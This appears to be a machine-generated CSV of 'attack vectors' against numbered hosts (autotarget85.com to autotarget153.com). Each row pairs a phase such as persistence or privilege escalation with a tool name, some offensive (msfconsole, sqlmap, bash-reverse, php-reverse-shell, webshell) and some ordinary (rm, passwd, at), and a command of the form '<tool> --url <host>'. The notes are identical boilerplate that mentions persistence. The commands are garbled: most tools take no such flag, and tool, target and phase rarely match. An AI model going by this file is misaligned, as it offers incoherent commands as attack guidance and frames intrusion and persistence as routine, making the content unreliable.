target_type,subtype,phase,tool,command,notes
WebApp,General,Reconnaissance,sublist3r,sublist3r --url http://autotarget85.com,"This vector uses sublist3r during the reconnaissance phase against a General application. It targets http://autotarget85.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Privilege Escalation,artisan-command,artisan-command --url http://autotarget86.com,"This vector uses artisan-command during the privilege escalation phase against a SMB application. It targets http://autotarget86.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Reconnaissance,bash-reverse,bash-reverse --url http://autotarget87.com,"This vector uses bash-reverse during the reconnaissance phase against a General application. It targets http://autotarget87.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Reconnaissance,atq,atq --url http://autotarget88.com,"This vector uses atq during the reconnaissance phase against a SNMP application. It targets http://autotarget88.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Cleanup,curl,curl --url http://autotarget89.com,"This vector uses curl during the cleanup phase against a Node.js application. It targets http://autotarget89.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Enumeration,freerdp,freerdp --url http://autotarget90.com,"This vector uses freerdp during the enumeration phase against a General application. It targets http://autotarget90.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Privilege Escalation,crontab,crontab --url http://autotarget91.com,"This vector uses crontab during the privilege escalation phase against a General application. It targets http://autotarget91.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Persistence,msfconsole,msfconsole --url http://autotarget92.com,"This vector uses msfconsole during the persistence phase against a FTP application. It targets http://autotarget92.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Scanning,del,del --url http://autotarget93.com,"This vector uses del during the scanning phase against a Drupal application. It targets http://autotarget93.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Persistence,exploit-db,exploit-db --url http://autotarget94.com,"This vector uses exploit-db during the persistence phase against a SNMP application. It targets http://autotarget94.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Cleanup,env-vars,env-vars --url http://autotarget95.com,"This vector uses env-vars during the cleanup phase against a Magento application. It targets http://autotarget95.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Privilege Escalation,drupwn,drupwn --url http://autotarget96.com,"This vector uses drupwn during the privilege escalation phase against a General application. It targets http://autotarget96.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Cleanup,linpeas,linpeas --url http://autotarget97.com,"This vector uses linpeas during the cleanup phase against a RDP application. It targets http://autotarget97.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Scanning,bash-reverse,bash-reverse --url http://autotarget98.com,"This vector uses bash-reverse during the scanning phase against a Laravel application. It targets http://autotarget98.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Scanning,snmpwalk,snmpwalk --url http://autotarget99.com,"This vector uses snmpwalk during the scanning phase against a SMB application. It targets http://autotarget99.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Post Exploitation,freerdp,freerdp --url http://autotarget100.com,"This vector uses freerdp during the post exploitation phase against a ASP.NET application. It targets http://autotarget100.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Persistence,xss,xss --url http://autotarget101.com,"This vector uses xss during the persistence phase against a Drupal application. It targets http://autotarget101.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Exploitation,dirsearch,dirsearch --url http://autotarget102.com,"This vector uses dirsearch during the exploitation phase against a SMB application. It targets http://autotarget102.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Cleanup,drupwn,drupwn --url http://autotarget103.com,"This vector uses drupwn during the cleanup phase against a Magento application. It targets http://autotarget103.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Reconnaissance,exploit-db,exploit-db --url http://autotarget104.com,"This vector uses exploit-db during the reconnaissance phase against a Node.js application. It targets http://autotarget104.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Cleanup,dnsrecon,dnsrecon --url http://autotarget105.com,"This vector uses dnsrecon during the cleanup phase against a Drupal application. It targets http://autotarget105.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Exploitation,dirsearch,dirsearch --url http://autotarget106.com,"This vector uses dirsearch during the exploitation phase against a RDP application. It targets http://autotarget106.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Enumeration,sqlmap,sqlmap --url http://autotarget107.com,"This vector uses sqlmap during the enumeration phase against a Drupal application. It targets http://autotarget107.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Cleanup,artisan-command,artisan-command --url http://autotarget108.com,"This vector uses artisan-command during the cleanup phase against a Laravel application. It targets http://autotarget108.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Persistence,browser-exploit,browser-exploit --url http://autotarget109.com,"This vector uses browser-exploit during the persistence phase against a RDP application. It targets http://autotarget109.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Enumeration,nikto,nikto --url http://autotarget110.com,"This vector uses nikto during the enumeration phase against a Drupal application. It targets http://autotarget110.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Reconnaissance,exploit-db,exploit-db --url http://autotarget111.com,"This vector uses exploit-db during the reconnaissance phase against a RDP application. It targets http://autotarget111.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Persistence,authorized_keys,authorized_keys --url http://autotarget112.com,"This vector uses authorized_keys during the persistence phase against a ASP.NET application. It targets http://autotarget112.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Scanning,rm,rm --url http://autotarget113.com,"This vector uses rm during the scanning phase against a General application. It targets http://autotarget113.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Cleanup,proxychains,proxychains --url http://autotarget114.com,"This vector uses proxychains during the cleanup phase against a PHP application. It targets http://autotarget114.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Enumeration,nslookup,nslookup --url http://autotarget115.com,"This vector uses nslookup during the enumeration phase against a Node.js application. It targets http://autotarget115.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Privilege Escalation,artisan-command,artisan-command --url http://autotarget116.com,"This vector uses artisan-command during the privilege escalation phase against a Drupal application. It targets http://autotarget116.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Enumeration,xss,xss --url http://autotarget117.com,"This vector uses xss during the enumeration phase against a PHP application. It targets http://autotarget117.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Reconnaissance,systemctl,systemctl --url http://autotarget118.com,"This vector uses systemctl during the reconnaissance phase against a SMB application. It targets http://autotarget118.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Reconnaissance,php artisan,php artisan --url http://autotarget119.com,"This vector uses php artisan during the reconnaissance phase against a Laravel application. It targets http://autotarget119.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Exploitation,pm2,pm2 --url http://autotarget120.com,"This vector uses pm2 during the exploitation phase against a RDP application. It targets http://autotarget120.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Scanning,systemctl,systemctl --url http://autotarget121.com,"This vector uses systemctl during the scanning phase against a Magento application. It targets http://autotarget121.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Reconnaissance,pm2,pm2 --url http://autotarget122.com,"This vector uses pm2 during the reconnaissance phase against a PHP application. It targets http://autotarget122.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Exploitation,webshell,webshell --url http://autotarget123.com,"This vector uses webshell during the exploitation phase against a Node.js application. It targets http://autotarget123.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Post Exploitation,sudo-l,sudo-l --url http://autotarget124.com,"This vector uses sudo-l during the post exploitation phase against a SMB application. It targets http://autotarget124.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Persistence,at,at --url http://autotarget125.com,"This vector uses at during the persistence phase against a WordPress application. It targets http://autotarget125.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Enumeration,smbexec,smbexec --url http://autotarget126.com,"This vector uses smbexec during the enumeration phase against a ASP.NET application. It targets http://autotarget126.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Scanning,ftp,ftp --url http://autotarget127.com,"This vector uses ftp during the scanning phase against a PHP application. It targets http://autotarget127.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Scanning,config-leak,config-leak --url http://autotarget128.com,"This vector uses config-leak during the scanning phase against a Joomla application. It targets http://autotarget128.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Exploitation,net user,net user --url http://autotarget129.com,"This vector uses net user during the exploitation phase against a ASP.NET application. It targets http://autotarget129.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Reconnaissance,artisan-command,artisan-command --url http://autotarget130.com,"This vector uses artisan-command during the reconnaissance phase against a Magento application. It targets http://autotarget130.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Post Exploitation,authorized_keys,authorized_keys --url http://autotarget131.com,"This vector uses authorized_keys during the post exploitation phase against a SMB application. It targets http://autotarget131.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Persistence,dig,dig --url http://autotarget132.com,"This vector uses dig during the persistence phase against a ASP.NET application. It targets http://autotarget132.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Enumeration,dnsrecon,dnsrecon --url http://autotarget133.com,"This vector uses dnsrecon during the enumeration phase against a Joomla application. It targets http://autotarget133.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Post Exploitation,crackmapexec,crackmapexec --url http://autotarget134.com,"This vector uses crackmapexec during the post exploitation phase against a ASP.NET application. It targets http://autotarget134.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Post Exploitation,sudoedit,sudoedit --url http://autotarget135.com,"This vector uses sudoedit during the post exploitation phase against a Joomla application. It targets http://autotarget135.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Reconnaissance,passwd,passwd --url http://autotarget136.com,"This vector uses passwd during the reconnaissance phase against a RDP application. It targets http://autotarget136.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Privilege Escalation,find,find --url http://autotarget137.com,"This vector uses find during the privilege escalation phase against a Node.js application. It targets http://autotarget137.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Cleanup,passwd,passwd --url http://autotarget138.com,"This vector uses passwd during the cleanup phase against a FTP application. It targets http://autotarget138.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Privilege Escalation,passwd,passwd --url http://autotarget139.com,"This vector uses passwd during the privilege escalation phase against a Joomla application. It targets http://autotarget139.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Post Exploitation,nikto,nikto --url http://autotarget140.com,"This vector uses nikto during the post exploitation phase against a General application. It targets http://autotarget140.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Cleanup,browser-exploit,browser-exploit --url http://autotarget141.com,"This vector uses browser-exploit during the cleanup phase against a General application. It targets http://autotarget141.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Cleanup,upload-shell,upload-shell --url http://autotarget142.com,"This vector uses upload-shell during the cleanup phase against a ASP.NET application. It targets http://autotarget142.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Scanning,ftp,ftp --url http://autotarget143.com,"This vector uses ftp during the scanning phase against a RDP application. It targets http://autotarget143.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Enumeration,wpscan,wpscan --url http://autotarget144.com,"This vector uses wpscan during the enumeration phase against a FTP application. It targets http://autotarget144.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Reconnaissance,passwd,passwd --url http://autotarget145.com,"This vector uses passwd during the reconnaissance phase against a Magento application. It targets http://autotarget145.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Enumeration,sudoedit,sudoedit --url http://autotarget146.com,"This vector uses sudoedit during the enumeration phase against a Node.js application. It targets http://autotarget146.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Privilege Escalation,systemd,systemd --url http://autotarget147.com,"This vector uses systemd during the privilege escalation phase against a Joomla application. It targets http://autotarget147.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Privilege Escalation,php-reverse-shell,php-reverse-shell --url http://autotarget148.com,"This vector uses php-reverse-shell during the privilege escalation phase against a SNMP application. It targets http://autotarget148.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Exploitation,passwd,passwd --url http://autotarget149.com,"This vector uses passwd during the exploitation phase against a Magento application. It targets http://autotarget149.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Reconnaissance,curl,curl --url http://autotarget150.com,"This vector uses curl during the reconnaissance phase against a Drupal application. It targets http://autotarget150.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Persistence,php artisan,php artisan --url http://autotarget151.com,"This vector uses php artisan during the persistence phase against a Magento application. It targets http://autotarget151.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Privilege Escalation,linpeas,linpeas --url http://autotarget152.com,"This vector uses linpeas during the privilege escalation phase against a Drupal application. It targets http://autotarget152.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Scanning,at,at --url http://autotarget153.com,"This vector uses at during the scanning phase against a General application. It targets http://autotarget153.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
